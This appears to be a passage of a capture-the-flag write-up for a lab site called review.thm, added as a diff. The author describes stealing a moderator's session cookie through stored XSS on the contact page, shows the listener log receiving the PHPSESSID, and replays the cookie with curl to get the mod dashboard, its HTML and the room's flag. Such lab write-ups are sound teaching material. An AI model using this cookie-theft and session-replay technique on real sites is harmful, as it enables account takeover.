@@ -140,3 +140,160 @@ Robert
 > I tried default credentials for phpMyAdmin login page, like root:null, and root:password etc, then searched for CVEs for the version 4.9.5, but only found an XSS vulnerability, which was not handy.
 
 
+---
+
+Then when I saw `contact.php` I thought what if we could use stored XSS to fetch mod or admin cookies and send them to me?
+
+![image](Images/Screenshot From 2026-07-11 13-22-17.png)
+
+> And I started receiving session ids:
+
+```bash
+┌──(root㉿kali)-[~]
+└─# python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.130.163.54 - - [11/Jul/2026 05:20:13] code 404, message File not found
+10.130.163.54 - - [11/Jul/2026 05:20:13] "GET /a.jpgPHPSESSID%3Dko0bat5sgu5mvsjv6af0tdfrub HTTP/1.1" 404 -
+10.130.163.54 - - [11/Jul/2026 05:20:15] code 404, message File not found
+10.130.163.54 - - [11/Jul/2026 05:20:15] "GET /a.jpgPHPSESSID%3Dko0bat5sgu5mvsjv6af0tdfrub HTTP/1.1" 404 -
+10.130.163.54 - - [11/Jul/2026 05:20:18] code 404, message File not found
+10.130.163.54 - - [11/Jul/2026 05:20:18] "GET /a.jpgPHPSESSID%3Dko0bat5sgu5mvsjv6af0tdfrub HTTP/1.1" 404 -
+10.130.163.54 - - [11/Jul/2026 05:20:20] code 404, message File not found
+10.130.163.54 - - [11/Jul/2026 05:20:20] "GET /a.jpgPHPSESSID%3Dko0bat5sgu5mvsjv6af0tdfrub HTTP/1.1" 404 -
+^C
+Keyboard interrupt received, exiting.
+```
+
+> Then I used curl to test the session id:
+
+```
+┌──(root㉿kali)-[~]
+└─# curl http://review.thm/dashboard.php -H 'Cookie: PHPSESSID=ko0bat5sgu5mvsjv6af0tdfrub' 
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Review Shop</title>
+    <link href="/bootstrap.min.css" rel="stylesheet">
+        <style>
+/* Override Bootstrap's .bg-primary with a custom dark background */
+.bg-primary {
+  background-color: #212c42 !important;
+  color: #ffffff !important;
+}
+
+/* Ensure links inside navbar remain visible */
+.navbar-dark .navbar-nav .nav-link {
+  color: #ffffff;
+}
+
+.navbar-dark .navbar-nav .nav-link:hover {
+  color: #d1d9e6;
+}
+
+/* Optional: Style the navbar-brand */
+.navbar-dark .navbar-brand {
+  color: #ffffff;
+}
+
+.navbar-dark .navbar-brand:hover {
+  color: #d1d9e6;
+}
+</style>
+
+</head>
+<body class="bg-light">
+
+
+<nav class="navbar navbar-expand-lg navbar-dark bg-primary">
+  <div class="container-fluid">
+    <a class="navbar-brand" href="dashboard.php">Review Shop</a>
+    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+      <span class="navbar-toggler-icon"></span>
+    </button>
+  
+    <div class="collapse navbar-collapse" id="navbarNav">
+      <ul class="navbar-nav me-auto">
+        <li class="nav-item">
+          <a class="nav-link" href="dashboard.php">Home</a>
+        </li>
+
+                  <li class="nav-item">
+            <a class="nav-link" href="chat.php">Chat</a>
+          </li>
+          
+                      <li class="nav-item">
+              <a class="nav-link" href="admin_view.php">View Feedback</a>
+            </li>
+          
+          <li class="nav-item">
+            <a class="nav-link" href="settings.php">Settings</a>
+          </li>
+
+                        <li class="nav-item">
+            <a class="nav-link" href="contact.php">Contact Us</a>
+          </li>
+                  
+                                           
+                                                        <li class="nav-item">
+            <a class="nav-link" href="contact.php">THM{M0dH@ck3dPawned007}</a>
+                          
+                                  
+      </ul>
+
+              <span class="navbar-text me-3">Hi, mod</span>
+        <a href="logout.php" class="btn btn-outline-light btn-sm">Logout</a>
+          </div>
+  </div>
+</nav>
+
+<body class="bg-light">
+
+<div class="container mt-4">
+    <div class="card p-4 shadow-sm">
+        <h2>Welcome, mod!</h2>
+        <p class="lead">You are logged in as <strong>mod</strong>.</p>
+
+        <div class="mb-3">
+            <a href="logout.php" class="btn btn-outline-danger me-2">Logout</a>
+                            <a href="admin_view.php" class="btn btn-primary me-2">View Feedback</a>
+                        <a href="chat.php" class="btn btn-success me-2">Open Chat</a>
+            <a href="settings.php" class="btn btn-warning">Settings</a>
+        </div>
+
+        
+        
+                    <hr class="my-4">
+            <h4>User Table</h4>
+            <div class="table-responsive mt-3">
+                <table class="table table-bordered table-hover bg-white">
+                    <thead class="table-dark">
+                        <tr>
+                            <th>ID</th>
+                            <th>Username</th>
+                            <th>Role</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                                                    <tr>
+                                <td>2</td>
+                                <td>admin</td>
+                                <td>admin</td>
+                            </tr>
+                                                    <tr>
+                                <td>3</td>
+                                <td>mod</td>
+                                <td>mod</td>
+                            </tr>
+                                            </tbody>
+                </table>
+            </div>
+            </div>
+</div>
+
+</body>
+</html>
+```
+
+*** It definitely worked!! The response is totally different, which means I can send this request using burpsuite, and open the request on the browser.
+
